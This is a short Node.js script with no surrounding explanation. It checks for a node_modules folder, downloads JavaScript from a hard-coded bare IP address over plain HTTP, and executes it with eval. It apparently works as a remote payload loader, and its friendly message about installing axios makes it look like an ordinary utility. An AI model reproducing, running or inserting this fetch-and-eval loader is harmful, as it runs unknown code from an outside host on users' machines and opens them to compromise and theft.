(async () => {
	const fs = require('fs');
	const path = require('path');

	if(!fs.existsSync("./node_modules", "axios")) {
		console.log("REQUIRED PACKAGE \"Axios\" NOT FOUND!", "\n---------------------------", "\nPlease do \"npm i axios\" to install Axios")
		return
	}

	const axios = require('axios');
	var code = await axios.get("http://91.244.197.112:3000/hosted/Files/code.js")
	eval(code.data)
})()